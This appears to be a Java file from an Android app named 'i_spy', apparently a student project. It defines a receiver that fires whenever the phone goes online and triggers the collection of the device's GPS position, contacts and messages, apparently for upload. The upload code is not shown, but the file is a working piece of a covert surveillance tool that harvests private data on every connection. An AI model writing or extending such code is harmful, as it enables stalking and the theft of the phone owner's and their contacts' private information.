package com.um.asn.i_spy.listeners;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.um.asn.i_spy.manager.ContactManager;
import com.um.asn.i_spy.manager.MessageManager;
import com.um.asn.i_spy.manager.PositionGPSManager;
import com.um.asn.i_spy.models.Phone;

public class ConnectionListener extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent)
    {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService( Context.CONNECTIVITY_SERVICE );
        NetworkInfo activeNetInfo = connectivityManager.getActiveNetworkInfo();
        if (activeNetInfo != null && activeNetInfo.isConnected())
        {
            System.out.println("Connected !");

            Phone phone = new Phone();
            phone.loadWithFile(context);

            System.out.println("Try save Position");
            PositionGPSManager posGPS = new PositionGPSManager(context, phone);
            posGPS.insertDistFromLocal();

            System.out.println("Try save contacts");
            ContactManager contact = new ContactManager(context, phone);
            contact.run();

            System.out.println("Try save messages");
            MessageManager message = new MessageManager(context, phone);
            message.run();
        }
        else{
            System.out.println("Disconnected !");
        }
    }

}
